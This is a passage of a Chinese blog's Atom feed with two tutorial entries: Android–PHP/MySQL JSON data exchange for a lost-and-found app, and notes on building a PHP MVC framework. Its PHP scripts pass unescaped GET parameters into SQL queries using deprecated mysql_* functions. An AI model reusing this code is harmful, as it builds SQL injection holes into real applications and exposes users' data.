<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Uknow’s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://uknowsec.cn/"/>
  <updated>2017-10-23T03:45:24.896Z</updated>
  <id>http://uknowsec.cn/</id>
  
  <author>
    <name>uknow</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android App端与PHP Web端的简单数据交互实现</title>
    <link href="http://uknowsec.cn/posts/notes/Android-App%E7%AB%AF%E4%B8%8EPHP-Web%E7%AB%AF%E7%9A%84%E7%AE%80%E5%8D%95%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92%E5%AE%9E%E7%8E%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/Android-App端与PHP-Web端的简单数据交互实现.html</id>
    <published>2017-10-23T02:43:11.000Z</published>
    <updated>2017-10-23T03:45:24.896Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于学校科技立项的项目需要实现Android App端与PHP Web端的简单数据交互的实现，当前场景是Web端使用的是MySql数据库，Apache服务器和PHP语言编写的。数据交互的简单理解就是Android能向服务端进行数据获取，同时也能进行数据提交。</p>
<h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/webandorid%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt=""></p>
<h3 id="流程说明"><a href="#流程说明" class="headerlink" title="流程说明"></a>流程说明</h3><ul>
<li>Andorid Server端对MySql数据库进行简单的查询操作，并将查询数据结果转换为Json格式提供给Andorid利用OKhttp读取再解析Json展示到APP上；同时Andorid端利用OKhttp提交给Andorid Server端，由Server端对MySql数据库对提交数据的添加。</li>
<li>Apache Server端通过解析PHP源代码，对MySql数据库的增删查改显示在WebSite。</li>
</ul>
<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="Andorid-Server"><a href="#Andorid-Server" class="headerlink" title="Andorid Server"></a>Andorid Server</h3><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>get_all_found_items.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">header(&apos;Content-Type:text/html;charset=utf-8&apos;);/*设置php编码为utf-8*/</div><div class="line">/* </div><div class="line"> * Following code will list all the items </div><div class="line"> */  </div><div class="line">   </div><div class="line">// array for JSON response  </div><div class="line">$response = array();  </div><div class="line">   </div><div class="line">// include db connect class  </div><div class="line">require_once __DIR__ . &apos;/db_connect.php&apos;;  </div><div class="line">   </div><div class="line">// connecting to db  </div><div class="line">$db = new DB_CONNECT();  </div><div class="line">   </div><div class="line">// get all items from items table  </div><div class="line">$result = mysql_query(&quot;SELECT *FROM items WHERE type=&apos;1&apos;&quot;) or die(mysql_error());  </div><div class="line">// check for empty result  </div><div class="line">if (mysql_num_rows($result) &gt; 0) &#123;  </div><div class="line">    // looping through all results  </div><div class="line">    // items node  </div><div class="line">    $response[&quot;items&quot;] = array();  </div><div class="line">   </div><div class="line">    while ($row = mysql_fetch_array($result)) &#123;  </div><div class="line">        // temp user array  </div><div class="line">        $items = array();  </div><div class="line">        $items[&quot;what&quot;] = $row[&quot;what&quot;];  </div><div class="line">        $items[&quot;when&quot;] = $row[&quot;when&quot;];  </div><div class="line">        $items[&quot;where&quot;] = $row[&quot;where&quot;];  </div><div class="line">        $items[&quot;detail&quot;] = $row[&quot;detail&quot;];</div><div class="line">        $items[&quot;posttime&quot;] = $row[&quot;posttime&quot;];			</div><div class="line">		$resultcontcat = mysql_query(&quot;SELECT *FROM guests&quot;) or die(mysql_error()); </div><div class="line">		while ($row1 = mysql_fetch_array($resultcontcat)) &#123; </div><div class="line">			if ($row1[&quot;id&quot;] == $row[&quot;gid&quot;])&#123;</div><div class="line">				$items[&quot;contact&quot;] = $row1[&quot;contact&quot;];</div><div class="line">			&#125;</div><div class="line">			&#125;</div><div class="line">        // push single items into final response array  </div><div class="line">        array_push($response[&quot;items&quot;], $items);  </div><div class="line">    &#125;  </div><div class="line">    // success  </div><div class="line">    $response[&quot;success&quot;] = 1;  </div><div class="line">   </div><div class="line">    // echoing JSON response  </div><div class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE); </div><div class="line">&#125; else &#123;  </div><div class="line">    // no items found  </div><div class="line">    $response[&quot;success&quot;] = 0;  </div><div class="line">    $response[&quot;message&quot;] = &quot;No items found&quot;;  </div><div class="line">   </div><div class="line">    // echo JSON  </div><div class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);  </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>如以上PHP代码可知通过require_once()函数包含db_connect.php文件，执行数据库配置文件。定义数组\$response接收查询的数据结果，通过判断不同的情况赋值$response[“success”]，并返回到Web页面显示</p>
<p>PHP文件执行结果<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171023110706.png" alt=""></p>
<p>JSON<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;items&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;what&quot;: &quot;手表&quot;,</div><div class="line">            &quot;when&quot;: &quot;2017-10-21 00:00:00&quot;,</div><div class="line">            &quot;where&quot;: &quot;北区宿舍楼#504&quot;,</div><div class="line">            &quot;detail&quot;: &quot;白色的手表，XX品牌&quot;,</div><div class="line">            &quot;posttime&quot;: &quot;2017-10-21 13:03:09&quot;,</div><div class="line">            &quot;contact&quot;: &quot;138123456&quot;</div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            &quot;what&quot;: &quot;手机&quot;,</div><div class="line">            &quot;when&quot;: &quot;2017-10-04 00:00:00&quot;,</div><div class="line">            &quot;where&quot;: &quot;北区商店#111&quot;,</div><div class="line">            &quot;detail&quot;: &quot;iphone6s,土豪金&quot;,</div><div class="line">            &quot;posttime&quot;: &quot;2017-10-21 13:03:46&quot;,</div><div class="line">            &quot;contact&quot;: &quot;137123456&quot;</div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            &quot;what&quot;: &quot;电脑&quot;,</div><div class="line">            &quot;when&quot;: &quot;2017-10-21 14:39:54&quot;,</div><div class="line">            &quot;where&quot;: &quot;图书馆#203&quot;,</div><div class="line">            &quot;detail&quot;: &quot;联想品牌笔记本&quot;,</div><div class="line">            &quot;posttime&quot;: &quot;2017-10-21 17:08:14&quot;,</div><div class="line">            &quot;contact&quot;: &quot;5670001&quot;</div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            &quot;what&quot;: &quot;细说PHP&quot;,</div><div class="line">            &quot;when&quot;: &quot;2017-09-21 13:03:46&quot;,</div><div class="line">            &quot;where&quot;: &quot;南馆#403&quot;,</div><div class="line">            &quot;detail&quot;: &quot;黑色封面，第二版《细说PHP》&quot;,</div><div class="line">            &quot;posttime&quot;: &quot;2017-10-21 17:36:53&quot;,</div><div class="line">            &quot;contact&quot;: &quot;63513641&quot;</div><div class="line">        &#125;</div><div class="line">    ],</div><div class="line">    &quot;success&quot;: 1</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="提交数据"><a href="#提交数据" class="headerlink" title="提交数据"></a>提交数据</h4><p>create_found_items.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">header(&apos;Content-Type:text/html;charset=utf-8&apos;);/*设置php编码为utf-8*/   </div><div class="line">/* </div><div class="line"> * Following code will create a new product row </div><div class="line"> * All product details are read from HTTP GET Request </div><div class="line"> */  </div><div class="line">   </div><div class="line">// array for JSON response  </div><div class="line">$response = array();  </div><div class="line">   </div><div class="line">// check for required fields  </div><div class="line">if (isset($_GET[&apos;what&apos;]) &amp;&amp; isset($_GET[&apos;when&apos;]) &amp;&amp; isset($_GET[&apos;where&apos;]) &amp;&amp; isset($_GET[&apos;detail&apos;])&amp;&amp; isset($_GET[&apos;contact&apos;])) &#123;  </div><div class="line">   </div><div class="line">    $what = $_GET[&apos;what&apos;];  </div><div class="line">    $when = $_GET[&apos;when&apos;];  </div><div class="line">    $where = $_GET[&apos;where&apos;];  </div><div class="line">    $detail = $_GET[&apos;detail&apos;]; </div><div class="line">    $contact = $_GET[&apos;contact&apos;];	</div><div class="line">	</div><div class="line">    // include db connect class  </div><div class="line">    require_once __DIR__ . &apos;/db_connect.php&apos;;  </div><div class="line">   </div><div class="line">    // connecting to db  </div><div class="line">    $db = new DB_CONNECT();  </div><div class="line">   </div><div class="line">    // mysql inserting a new row  </div><div class="line">	$result2 = mysql_query(&quot;INSERT INTO guests(contact) VALUES(&apos;$contact&apos;)&quot;);  </div><div class="line">	$gidresult = mysql_query(&quot;SELECT id FROM `guests` WHERE contact=&apos;$contact&apos;&quot;);	</div><div class="line">	while ($row = mysql_fetch_array($gidresult)) &#123; </div><div class="line">			$gid=$row[&apos;id&apos;];</div><div class="line">		&#125;</div><div class="line">    $result1 = mysql_query(&quot;INSERT INTO items(`what`, `when`, `where`, `type` ,`gid`, `detail`) VALUES(&apos;$what&apos;, &apos;$when&apos;, &apos;$where&apos;, &apos;1&apos;, &apos;$gid&apos;, &apos;$detail&apos;)&quot;);   </div><div class="line">   </div><div class="line">    // check if row inserted or not  </div><div class="line">    if ($result1 &amp;&amp; $result2) &#123;  </div><div class="line">        // successfully inserted into database  </div><div class="line">        $response[&quot;success&quot;] = 1;  </div><div class="line">        $response[&quot;message&quot;] = &quot;Items successfully created.&quot;;  </div><div class="line">   </div><div class="line">        // echoing JSON response  </div><div class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);   </div><div class="line">    &#125; else &#123;  </div><div class="line">        // failed to insert row  </div><div class="line">        $response[&quot;success&quot;] = 0;  </div><div class="line">        $response[&quot;message&quot;] = &quot;Oops! An error occurred.&quot;;  </div><div class="line">   </div><div class="line">        // echoing JSON response  </div><div class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);   </div><div class="line">    &#125;  </div><div class="line">&#125; else &#123;  </div><div class="line">    // required field is missing  </div><div class="line">    $response[&quot;success&quot;] = 0;  </div><div class="line">    $response[&quot;message&quot;] = &quot;Required field(s) is missing&quot;;  </div><div class="line">   </div><div class="line">    // echoing JSON response  </div><div class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);   </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>判断GET请求的参数是否都存在，把获取的GET请求参数作为数据INSERT TO MySQL数据库。判断INSERT执行过程赋值\$response[“success”]对应相应的$response[“message”]，显示在Web页面。</p>
<p>执行结果<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720171023111323_%E7%9C%8B%E5%9B%BE%E7%8E%8B.png" alt=""></p>
<h3 id="Andorid"><a href="#Andorid" class="headerlink" title="Andorid"></a>Andorid</h3><h4 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h4><p>核心代码 queryLosts()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">private void queryLosts() &#123;</div><div class="line">	losts.clear();</div><div class="line">	new Thread(new Runnable() &#123;</div><div class="line">		</div><div class="line">		@Override</div><div class="line">		public void run() &#123;</div><div class="line">			// TODO Auto-generated method stub</div><div class="line">			</div><div class="line">	        OkHttpClient okHttpClient = new OkHttpClient();</div><div class="line">	        String url = &quot;http://webSite/androidapi/get_all_lost_items.php&quot;;</div><div class="line">	        Request request = new Request.Builder()</div><div class="line">	                .url(url)</div><div class="line">	                .build();</div><div class="line">	        Call call = okHttpClient.newCall(request);</div><div class="line">	        try &#123;</div><div class="line">	            Response response = call.execute();</div><div class="line">	            String res = response.body().string();</div><div class="line">	            if (res != null &amp;&amp; !res.trim().equals(&quot;&quot;))&#123;</div><div class="line">	                JSONObject jsonObject = new JSONObject(res);</div><div class="line">	                if (jsonObject.getInt(&quot;success&quot;) == 1)&#123;</div><div class="line">	                    JSONArray jsonArray = jsonObject.getJSONArray(&quot;items&quot;);</div><div class="line">	                    for (int i = jsonArray.length() - 1;i &gt;= 0;i--)&#123;</div><div class="line">	                        JSONObject item = jsonArray.getJSONObject(i);</div><div class="line">	                        String what = null;</div><div class="line">	                        try &#123;</div><div class="line">	                            what = item.getString(&quot;what&quot;);</div><div class="line">	                        &#125;catch (Exception e)&#123;</div><div class="line"></div><div class="line">	                        &#125;</div><div class="line">	                        String when = null;</div><div class="line">	                        try&#123;</div><div class="line">	                            when = item.getString(&quot;when&quot;);</div><div class="line">	                        &#125;catch (Exception e)&#123;</div><div class="line"></div><div class="line">	                        &#125;</div><div class="line">	                        String where = null;</div><div class="line">	                        try&#123;</div><div class="line">	                            where = item.getString(&quot;where&quot;);</div><div class="line">	                        &#125;catch (Exception e)&#123;</div><div class="line"></div><div class="line">	                        &#125;</div><div class="line">	                        String detail = null;</div><div class="line">	                        try &#123;</div><div class="line">	                            detail = item.getString(&quot;detail&quot;);</div><div class="line">	                        &#125;catch (Exception e)&#123;</div><div class="line"></div><div class="line">	                        &#125;</div><div class="line">	                        String contact = null;</div><div class="line">	                        try &#123;</div><div class="line">	                            contact = item.getString(&quot;contact&quot;);</div><div class="line">	                        &#125;catch (Exception e)&#123;</div><div class="line"></div><div class="line">	                        &#125;</div><div class="line">	                        Lost lost = new Lost();</div><div class="line">	                        lost.setTitle(what);</div><div class="line">	                        String des = &quot;地点：&quot; + (where == null?&quot;&quot;:where) +&quot;     &quot;+&quot;时间：&quot; + (when == null?&quot;&quot;:when)+&quot;\r&quot; + &quot;     &quot;+&quot;描述：&quot; + (detail == null?&quot;&quot;:detail);</div><div class="line">	                        lost.setDescribe(des);</div><div class="line">	                        lost.setPhone(contact == null?&quot;&quot;:contact);</div><div class="line">	                        losts.add(lost);</div><div class="line">	                    &#125;</div><div class="line">	                &#125;</div><div class="line">	            &#125;</div><div class="line">	        &#125; catch (Exception e) &#123;</div><div class="line">	            e.printStackTrace();</div><div class="line">	            showErrorView(0);</div><div class="line"></div><div class="line">	        &#125;</div><div class="line">	        if (losts == null || losts.size() == 0) &#123;</div><div class="line">	        	handler.sendEmptyMessage(1);</div><div class="line">	            return;</div><div class="line">	        &#125;</div><div class="line">	        if (losts.size() &gt; 0)&#123;</div><div class="line">	           handler.sendEmptyMessage(2);</div><div class="line">	        &#125;</div><div class="line">		&#125;</div><div class="line">	&#125;).start();</div></pre></td></tr></table></figure>
<p>利用Android网络框架OKhttp,OKhttp一个处理网络请求的开源项目,是安卓端最火热的轻量级框架.请求接口url地址，获取Json数据利用JSONObject对Json数据进行解析。</p>
<h4 id="提交数据-1"><a href="#提交数据-1" class="headerlink" title="提交数据"></a>提交数据</h4><p>核心代码 addLost()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">public Handler handler = new Handler()&#123;</div><div class="line"></div><div class="line">	public void handleMessage(android.os.Message msg) &#123;</div><div class="line">		switch(msg.what)&#123;</div><div class="line">			case 1:</div><div class="line">				Toast.makeText(this,&quot;提交成功&quot;,Toast.LENGTH_LONG).show();</div><div class="line">				break;</div><div class="line">			case 2:</div><div class="line">				Toast.makeText(this,&quot;提交失败&quot;,Toast.LENGTH_LONG).show();</div><div class="line">				break;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">private void addLost()&#123;</div><div class="line">	OkHttpClient okHttpClient = new OkHttpClient();</div><div class="line">	String url =&quot;http://website/androidapi/create_lost_items.php?what=&quot;+title+&quot;&amp;when=&quot;+time+&quot;&amp;where=&quot;+place+&quot;&amp;detail=&quot;+describe+&quot;&amp;contact=&quot;+photo+&quot;&quot;;</div><div class="line">	Request request = new Request.Builder()</div><div class="line">			.url(url)</div><div class="line">			.build();</div><div class="line">	</div><div class="line"></div><div class="line">	try&#123;</div><div class="line">		Response response = okHttpClient.newCall(request).execute();</div><div class="line">		res = response.body().string();</div><div class="line">		handler.sendEmptyMessage(1);</div><div class="line">	&#125;catch (Exception e)</div><div class="line">	&#123;</div><div class="line">		e.printStackTrace();</div><div class="line">		handler.sendEmptyMessage(2);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同样利用Okhttp,GET方式提交参数，try-catch获取异常，通过返回值给出一定的提交结果提示。</p>
<h2 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h2><h3 id="数据同步"><a href="#数据同步" class="headerlink" title="数据同步"></a>数据同步</h3><h4 id="Web端"><a href="#Web端" class="headerlink" title="Web端"></a>Web端</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171023112834.png" alt=""></p>
<h4 id="Andorid端"><a href="#Andorid端" class="headerlink" title="Andorid端"></a>Andorid端</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720171023112949.jpg" alt=""></p>
<h3 id="数据提交"><a href="#数据提交" class="headerlink" title="数据提交"></a>数据提交</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720171023113352.jpg" alt=""></p>
<p>提交结果</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/Screenshot_2017-10-23-11-42-14-803_com.bmob.lostf.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171023114405.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP MVC开发框架学习笔记</title>
    <link href="http://uknowsec.cn/posts/notes/PHP-MVC%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/PHP-MVC开发框架学习笔记.html</id>
    <published>2017-10-19T02:12:35.000Z</published>
    <updated>2017-10-19T09:01:59.227Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h2><p>MVC模式（Model-View-Controller）是软件工程中的一种软件架构模式，把软件系统分为三个基本部分：模型（Model）、视图（View）和控制器（Controller）。</p>
<p>PHP中MVC模式也称Web MVC，从上世纪70年代进化而来。MVC的目的是实现一种动态的程序设计，便于后续对程序的修改和扩展简化，并且使程序某一部分的重复利用成为可能。除此之外，此模式通过对复杂度的简化，使程序结构更加直观。软件系统通过对自身基本部份分离的同时，也赋予了各个基本部分应有的功能。</p>
<h3 id="MVC各部分的职能"><a href="#MVC各部分的职能" class="headerlink" title="MVC各部分的职能"></a>MVC各部分的职能</h3><p>MVC各部分的职能：</p>
<ul>
<li>模型Model – 管理大部分的业务逻辑和所有的数据库逻辑。模型提供了连接和操作数据库的抽象层。</li>
<li>控制器Controller - 负责响应用户请求、准备数据，以及决定如何展示数据。</li>
<li>视图View – 负责渲染数据，通过HTML方式呈现给用户。</li>
</ul>
<h3 id="MVC流程"><a href="#MVC流程" class="headerlink" title="MVC流程"></a>MVC流程</h3><p>一个典型的Web MVC流程：</p>
<ul>
<li>Controller截获用户发出的请求；</li>
<li>Controller调用Model完成状态的读写操作；</li>
<li>Controller把数据传递给View；</li>
<li>View渲染最终结果并呈献给用户。</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/web_mvc.gif" alt=""></p>
<h2 id="MVC框架开发"><a href="#MVC框架开发" class="headerlink" title="MVC框架开发"></a>MVC框架开发</h2><h3 id="目录准备"><a href="#目录准备" class="headerlink" title="目录准备"></a>目录准备</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/mvc1.png" alt=""></p>
<h3 id="目录的作用"><a href="#目录的作用" class="headerlink" title="目录的作用"></a>目录的作用</h3><ul>
<li>application – 应用代码</li>
<li>config – 程序配置或数据库配置</li>
<li>myphp - 框架核心目录</li>
<li>public – 静态文件</li>
<li>runtime - 临时数据目录</li>
</ul>
<h3 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h3><ul>
<li>MySQL的表名需小写，如：item，car</li>
<li>模块名（Models）需首字母大写，，并在名称后添加“Model”，如：ItemModel，CarModel</li>
<li>控制器（Controllers）需首字母大写，，并在名称中添加“Controller”，如：ItemController，CarController</li>
<li>视图（Views）部署结构为“控制器名/行为名”，如：item/view.php，car/buy.php</li>
</ul>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>将所有的数据请求都重定向 index.php 文件，在 myphp-frame 目录下新建一个 .htaccess 文件，文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;IfModule mod_rewrite.c&gt;</div><div class="line"></div><div class="line">    RewriteEngine On</div><div class="line"></div><div class="line">    # 确保请求路径不是一个文件名或目录</div><div class="line"></div><div class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</div><div class="line"></div><div class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</div><div class="line"></div><div class="line">    # 重定向所有请求到 index.php?url=PATHNAME</div><div class="line"></div><div class="line">    RewriteRule ^(.*)$ index.php?url=$1 [PT,L]</div><div class="line"></div><div class="line">&lt;/IfModule&gt;</div></pre></td></tr></table></figure>
<p>这样做的主要原因有：</p>
<ul>
<li>程序有一个单一的入口；</li>
<li>除静态程序，其他所有程序都重定向到 index.php 上；</li>
<li>可以用来生成利于SEO的URL，想要更好的配置URL，后期可能会需要URL路由，这里先不做介绍了。</li>
</ul>
<h4 id="htaccess创建方法"><a href="#htaccess创建方法" class="headerlink" title=".htaccess创建方法"></a>.htaccess创建方法</h4><p>按组合键windows+R 打开运行，然后输入命名CMD，然后在输入copy con .htaccess 回车 （不会看到变化），然后再按ctrl+Z键，再回车，然后就创建了</p>
<h3 id="入口文件"><a href="#入口文件" class="headerlink" title="入口文件"></a>入口文件</h3><p>在 myphp-frame目录下添加 index.php 文件，文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">// 应用目录为当前目录</div><div class="line">define(&apos;APP_PATH&apos;, __DIR__.&apos;/&apos;);</div><div class="line">// 开启调试模式</div><div class="line">define(&apos;APP_DEBUG&apos;, true);</div><div class="line">// 网站根URL</div><div class="line">define(&apos;APP_URL&apos;, &apos;http://localhost/myphp&apos;);</div><div class="line">// 加载框架</div><div class="line">require &apos;./myphp/MyPHP.php&apos;;</div></pre></td></tr></table></figure>
<p>注意，上面的PHP代码中，并没有添加PHP结束符号”?&gt;”，这么做的主要原因是，对于只有 PHP 代码的文件，结束标志(“?&gt;”)最好不存在，PHP自身并不需要结束符号，不添加结束符号可以很大程度上防止末尾被添加额外的注入内容，让程序更加安全。</p>
<h3 id="配置文件和主请求"><a href="#配置文件和主请求" class="headerlink" title="配置文件和主请求"></a>配置文件和主请求</h3><p>在 index.php 中，我们对 myphp  文件夹下的 MyPHP.php 发起了请求，那么 MyPHP.php 这个启动文件中到底会包含哪些内容呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">// 应用目录为当前目录</div><div class="line">define(&apos;APP_PATH&apos;, __DIR__ . &apos;/&apos;);</div><div class="line"></div><div class="line">// 开启调试模式</div><div class="line">define(&apos;APP_DEBUG&apos;, true);</div><div class="line"></div><div class="line">// 加载框架文件</div><div class="line">require(APP_PATH . &apos;myphp/Myphp.php&apos;);</div><div class="line"></div><div class="line">// 加载配置文件</div><div class="line">$config = require(APP_PATH . &apos;config/config.php&apos;);</div><div class="line"></div><div class="line">// 实例化框架类</div><div class="line">(new Myphp($config))-&gt;run();</div></pre></td></tr></table></figure>
